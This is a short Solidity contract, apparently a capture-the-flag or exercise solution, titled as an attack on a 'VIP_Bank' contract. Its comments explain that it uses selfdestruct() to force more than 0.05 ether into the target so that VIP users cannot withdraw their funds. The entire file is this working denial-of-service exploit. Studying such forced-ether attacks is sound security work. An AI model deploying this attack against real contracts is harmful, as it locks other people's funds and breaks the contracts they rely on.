// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/**
 * @title Attacking the VIP_Bank contract
 * @author Purple_Calender
 * @dev used selfdestruct() function to add more than 0.05 ether in VIP_Bank
 * @dev to not withdraw funds back by VIPs.
 */

contract Attack {
    constructor() payable {}

    function attack(address _addr) public {
        selfdestruct(payable(_addr));
    }

    function getBalance() public view returns (uint bal) {
        bal = address(this).balance;
    }
}
